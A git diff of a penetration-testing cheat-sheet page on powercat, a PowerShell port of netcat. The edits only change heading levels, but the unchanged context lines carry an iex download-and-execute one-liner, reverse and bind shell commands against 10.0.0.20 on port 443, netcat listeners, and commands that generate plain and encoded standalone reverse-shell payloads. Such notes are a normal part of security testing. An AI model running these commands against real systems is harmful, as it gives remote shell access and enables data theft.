@@ -13,7 +13,7 @@ weight : 0
 
 Netcat: The powershell version. (Powershell Version 2 and Later Supported)
 
-### Installation
+## Installation
 
 powercat is a powershell function. First you need to load the function before you can execute it. You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.
 
@@ -27,13 +27,13 @@ Download the `.ps1` here and execute with the command below.
 
 Or invoke directly with `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
 
-### Usage
+## Usage
 
 ```plain
 powercat [-c or -l] [-p port] [options]
 ```
 
-### Flags
+## Flags
 
 ```plain
   -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
@@ -95,9 +95,9 @@ powercat [-c or -l] [-p port] [options]
   -h              Print this help message.
 ```
 
-### Examples
+## Examples
 
-#### Send a file to receiver
+### Send a file to receiver
 
 * Receiver: `nc -nlvp 443 > out.txt`
 
@@ -107,7 +107,7 @@ powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
 
 ### Shells (reverse/bind)
 
-#### Reverse shell
+### Reverse shell
 
 * Receiver: `nc -nlvp 443`
 * `-e` - specifies the application that is executed once connected
@@ -116,7 +116,7 @@ powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
 powercat -c 10.0.0.20 -p 443 -e cmd.exe
 ```
 
-#### Bind shell
+### Bind shell
 
 * `-l` - specifies powercat to create a listener
 * `-e` - specifies the application that is executed once connected
@@ -129,7 +129,7 @@ Once a connection is received (`nc <ip> 443`) the bind shell will be initiated.
 
 ### Payload Generation
 
-#### Standalone payloads
+### Standalone payloads
 
 * Non-encoded
 
@@ -143,6 +143,6 @@ powercat -c 10.0.0.20 -p 443 -e cmd.exe -g > reverse-shell.ps1
 powercat -c 10.0.0.20 -p 443 -e cmd.exe -ge > reverse-shell.ps1
 ```
 
-### URL list
+## URL List
 
 * [Github.com - powercat](https://github.com/besimorhino/powercat)
